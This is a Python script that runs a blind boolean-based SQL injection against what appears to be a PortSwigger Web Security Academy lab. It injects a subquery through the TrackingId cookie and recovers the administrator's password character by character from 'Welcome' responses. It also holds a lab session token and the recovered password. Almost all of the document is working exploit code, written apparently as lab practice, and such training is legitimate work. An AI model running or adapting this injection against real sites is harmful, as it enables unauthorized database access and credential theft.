import requests


target = "https://ac1f1f861fb1c6ecc081431700190051.web-security-academy.net/filter?category=Toys+%26+Games"
payload1 = "8Ugx4OYgLWWDBrbU' AND (SELECT substring(password,"
payload2 = ",1) FROM users WHERE username='administrator')='"
session = "Fma8vMS6q0YdOgKVcH7XJkInZZaDdFUo"
# list set up
file = open("/opt/wordlists/a-z0-9", mode="r")
chars = []
for line in file.readlines():
    chars.append(line[0])



password = []
def inject(num):

    for char in chars:
        cookies = {'TrackingId': payload1+str(num)+payload2+char, 'session': session}
        response = requests.get(url=target, cookies=cookies)
        if "Welcome" in response.text:
            password.append(char)
            print(password)
            try:
                inject(num+1)
            except Exception as e:
                break
    print(password)
    return None

list = ['6', 'd', '2', 'g', 'l', 'o', 'u', 'p', 'h', '2', 'd', '3', 't', 'u', 'l', 'b', 'l', 'f', 'z', 'k']
mystr = ""
for i in list:
    mystr += i
print(mystr)







